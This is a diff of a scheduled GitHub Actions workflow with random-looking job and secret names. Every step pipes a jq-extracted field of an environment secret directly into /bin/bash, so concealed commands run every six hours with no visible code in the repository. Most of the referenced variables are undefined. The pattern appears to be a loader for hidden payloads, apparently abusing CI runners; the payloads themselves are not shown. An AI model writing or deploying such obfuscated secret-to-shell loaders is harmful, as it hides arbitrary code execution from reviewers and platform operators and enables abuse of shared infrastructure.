@@ -2,18 +2,22 @@ name: xiaoyutou3876
 on:
   workflow_dispatch:
   schedule:
-    - cron: '4 2/6 * * *'
-
-jobs:  # 9486
+    - cron: '28 3/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: xiaoyutou3876
         env:
-          gemx10: ${{ secrets.gemx10 }}
+          cqx9328: ${{ secrets.cqx9328 }}
         run: |
-          echo $gemx10 | jq -r .tpums0 | /bin/bash
-          echo $btjsj167 | jq -r .u3 | /bin/bash
-          echo $ijqnl48 | jq -r .bsbmh402 | /bin/bash
+          echo $cqx9328 | jq -r .ft7 | /bin/bash
+          echo $fpw9 | jq -r .afxw834 | /bin/bash
+          echo $wdxjc81 | jq -r .p1 | /bin/bash
+          echo $gwa307 | jq -r .fyb9 | /bin/bash
+          echo $z3836 | jq -r .bzofj6021 | /bin/bash
+          echo $j8 | jq -r .iydb5893 | /bin/bash
+          echo $z2 | jq -r .hk3 | /bin/bash
+          echo $skl6 | jq -r .lvs8791 | /bin/bash
 
